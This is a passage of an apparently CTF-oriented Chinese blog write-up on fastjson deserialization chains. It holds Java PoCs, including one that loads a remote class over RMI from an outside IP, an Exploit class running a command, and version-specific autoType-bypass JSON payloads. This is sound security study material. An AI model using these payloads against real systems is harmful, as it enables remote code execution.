<span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>serial.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.npC4t.ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.ClassFiles.classAsBytes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serial</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String s = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;%s\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;xxx\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] clazz = classAsBytes(Exploit.class);</span><br><span class="line">        <span class="comment">//System.out.println(new String(Base64.getEncoder().encode(clazz)));</span></span><br><span class="line">        String jsonString = String.format(s,<span class="keyword">new</span> String(Base64.getEncoder().encode(clazz)));</span><br><span class="line">        <span class="comment">//System.out.println(jsonString);</span></span><br><span class="line">        JSON.parse(jsonString, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以注意到，JSON.parse的时候，用到了<code>Feature.SupportNonPublicField</code>，这是因为，无论是<code>_bytecodes</code>还是<code>_outputProperties</code>，他们在类中都是private修饰的，fastjson序列化的时候可不带上他们，也不会触发什么方法了，所以需要加上这个配置项才可利用，所以总的来说，这一条链还是挺鸡肋的，因为几乎不会有人这样子写</p>
+<p>所以这个看看就好了（x</p>
+<h3 id="0x02-com-sun-rowset-JdbcRowSetImpl"><a href="#0x02-com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="0x02 com.sun.rowset.JdbcRowSetImpl"></a>0x02 com.sun.rowset.JdbcRowSetImpl</h3><p>这个类jdk自带</p>
+<p>这条链比较简单，也比较常见，在反序列化时可以通过触发其setAutoCommit方法，触发rmi连接或ldap连接加载远程类实现RCE</p>
+<p>可以看一下这个方法</p>
+<p><img src="/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-29_22-24-06.png"></p>
+<p>调用this.connect()</p>
+<p><img src="/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-29_22-25-42.png"></p>
+<p>获取DataSourceName指定的资源</p>
+<p>简单写一个poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serial</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String s = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;: \&quot;rmi://121.37.10.254:1099/4fzkhd\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-29_22-27-44.png"></p>
+<p><strong>上面的poc基于fastjson1.2.24，在更高的版本，新增了黑名单和白名单的过滤，但仍然存在一些trick</strong></p>
+<p>fastjson1.2.22~1.2.24的payload(无过滤）:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://127.0.0.1:1099/a&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>fastjson1.2.25~1.2.47的payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/a&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个trick在1.2.25~1.2.32版本是受AutoTypeSupport影响的，只有在AutoTypeSupport为false的时候才可以利用成功，其他版本不受影响</p>
+<p>但这个配置好像在这几个版本默认是false的，所以应该影响不大</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(false);</span><br></pre></td></tr></table></figure>
+<p>最后需要注意的一点，这条链需要连外网，如果赛题没出网，那这个链就没用了</p>
+<h3 id="0x03-org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><a href="#0x03-org-apache-tomcat-dbcp-dbcp2-BasicDataSource" class="headerlink" title="0x03 org.apache.tomcat.dbcp.dbcp2.BasicDataSource"></a>0x03 org.apache.tomcat.dbcp.dbcp2.BasicDataSource</h3><p>这条链不需要出外网，也不需要设置什么特别的设置，触发条件比较低</p>
+<p>需要引入tomcat的包org.apache.tomcat.dbcp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-dbcp&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;10.0.0&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>虽然增加了这一条件，但这个依赖很常用</p>
+<p>链比较短</p>
+<p>首先，我们需要触发<code>BasicDataSource#getConnection()</code></p>
+<p><code>BasicDataSource#getConnection() -&gt; BasicDataSource#createDataSource() -&gt; BasicDataSource#createConnectionFactory() -&gt; DriverFactory#createDriver()</code></p>
+<p><img src="/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-30_15-50-47.png"></p>
+<p>可以看到，这里有Class.forName的调用，这里我们可以控制ClassLoader,还可以控制ClassName</p>
+<p>那么如何传入我们的恶意类的，我们知道Class.forName会根据类名加载类，但我们的恶意类并没有加载进虚拟机里，看似我们已经没有办法了，实则不然，接下来我们看一个神奇的classLoader,<code>com.sun.org.apache.bcel.internal.util.ClassLoader </code></p>
+<p>这个class加载器，它会直接从className中提取class字节码，完美契合我们的要求</p>
+<p>大致规则是，如果className以<code>$$BCEL$$</code>开头，那么它会提取后面的内容进行BCEL解码，并且将解码的内容作为class字节码，使用defineClass()加载class</p>
+<p>BCEL编码解码的方式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.bcel.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.ClassFiles.classAsBytes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data = classAsBytes(Exploit.class);</span><br><span class="line">        String code = Utility.encode(data,<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//byte[] payload = Utility.decode(code,true);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来就很简单了，我们只需要指定classLoader，将BCEL编码后的数据传入即可</p>
+<p>poc:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;x&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$&quot;+code</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: &quot;x&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里触发getConnect()的方法可以看看下面触发getter的分析</p>
+<p>给出完整的poc:</p>
+<p>Exploit.java:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.npC4t.ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Serial.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.npC4t.ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.bcel.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.ClassFiles.classAsBytes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data = classAsBytes(Exploit.class);</span><br><span class="line">        String code = Utility.encode(data,<span class="keyword">true</span>);</span><br><span class="line">        String s = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;x\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span>+code+<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;: \&quot;x\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//System.out.println(s);</span></span><br><span class="line">        JSON.parse(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-30_16-07-02.png"></p>
+<p><strong>注：jdk 8u251之后，<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>被删掉，漏洞也无法利用了</strong></p>
+<p>上面的复现，基于fastjson1.2.22~1.2.24，因为1.2.25之后加了autoType的限制，所以payload会有所区别，但绕过的方法不变，利用缓存可以绕过，直至1.2.47版本</p>
+<p>下面给出1.2.36~1.2.47版本的payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;cache1&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span> : <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>   : <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">    <span class="attr">&quot;x&quot;</span> : &#123;</span><br><span class="line">        <span class="attr">&quot;cache2&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span> : <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;val&quot;</span>   : <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;z&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span> : <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span>:<span class="string">&quot;$$BCEL$$%s&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.x.y.z.connection&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>fastjson1.2.33~1.2.36版本，使用另一个payload，这个payload也不知道为什么33以下版本不行（以后有时间研究研究x</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;cache1&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span> : <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>   : <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">    <span class="attr">&quot;x&quot;</span> : &#123;</span><br><span class="line">        <span class="attr">&quot;cache2&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span> : <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;val&quot;</span>   : <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;y&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">                &quot;z&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">                    &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot; : &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;driverClassName&quot;:&quot;$$BCEL$$%s&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">		&#125;:&quot;yy&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>fastjson1.2.33以下，1.2.24以上的版本，暂时没有找到可用的payload</p>
+<h3 id="0x04-谈谈如何fastjson如何触发类的getter方法"><a href="#0x04-谈谈如何fastjson如何触发类的getter方法" class="headerlink" title="0x04 谈谈如何fastjson如何触发类的getter方法"></a>0x04 谈谈如何fastjson如何触发类的getter方法</h3><p>我们知道，fastjson在反序列化的过程中，会调用类的setter方法进行初始化类，但是基本不会触发类的getter方法（除非这个getter满足某些条件，上面已经提到这一点了）。那如果我们需要触发某个类的getter方法，但是这个getter方法并不满足上面的那些特殊条件时，我们应该怎么办？下面介绍两种方法，两种方法针对不同的fastjson版本</p>
+<h4 id="fastjson-gt-1-2-36"><a href="#fastjson-gt-1-2-36" class="headerlink" title="fastjson&gt;=1.2.36"></a>fastjson&gt;=1.2.36</h4><p>可以使用$ref来触发getter</p>
+<p>例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;: &quot;App.Exec&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;App.Exec&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;$ref&quot;: &quot;$[1].flag&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p>通过$[1]引用数组第二个元素，获取flag属性，因此，fastjson会去调用对应的getter方法获取，这里就会调用getFlag方法</p>
+<h4 id="fastjson1-2-25-1-2-36"><a href="#fastjson1-2-25-1-2-36" class="headerlink" title="fastjson1.2.25~1.2.36"></a>fastjson1.2.25~1.2.36</h4><p>在比较低的版本，我们可以利用fastjson中JSONObject的toString方法，JSONObject是Map子类，只要触发toString，在将其转化为String的过程中，会提取类中属性，自然就会调用对应的getter方法</p>
+<p>触发toString的方法，很简单，就是将类放在JSON中的key的位置</p>
+<p>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;x&quot;:</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">			&quot;val&quot;:&quot;App.Exec&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">		&quot;x&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">				&quot;@type&quot;:&quot;App.Exec&quot;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;:&quot;x&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但这个方法在fastjson&gt;1.2.36时失去作用，暂时不清楚什么原因</p>
+<h4 id="fastjson1-2-22-1-2-24不用绕autoType"><a href="#fastjson1-2-22-1-2-24不用绕autoType" class="headerlink" title="fastjson1.2.22~1.2.24不用绕autoType"></a>fastjson1.2.22~1.2.24不用绕autoType</h4>
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+    
+        <a href="/2021/11/20/tp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">tp6.0.x反序列化</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            npC4t &copy; 2021 
+            <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme - <a target="_blank" rel="noopener" href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
